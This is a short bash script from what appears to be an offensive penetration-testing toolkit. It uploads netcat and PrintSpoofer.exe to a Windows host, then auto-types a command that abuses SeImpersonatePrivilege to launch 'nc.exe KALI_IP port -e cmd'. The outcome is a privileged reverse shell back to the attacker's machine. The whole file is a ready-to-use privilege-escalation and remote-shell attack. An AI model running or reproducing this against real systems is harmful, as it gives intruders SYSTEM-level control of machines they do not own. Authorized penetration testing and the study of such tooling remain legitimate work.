#!/bin/bash

: '
CMD: PrintSpoofer: Reverse shell to KALI_IP:443 using SeImpersonatePrivilege.
'

# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SHELL_PORT_FIELD=$(form_item  "shell port" "number" "shell_port" "1337")

# Generate GUI form
generate_form "${SHELL_PORT_FIELD}"

SHELL_PORT=${form_data["shell_port"]}

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="nc.exe"

cmd_upload_file "${LOCATION}" "${FILE}"
NC_FILE_LOCATION="${FILE_LOCATION}"
kill "${HTTP_PID}"

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="PrintSpoofer.exe"

cmd_upload_file "${LOCATION}" "${FILE}"
PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
kill "${HTTP_PID}"

paste_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
xdotool key Return
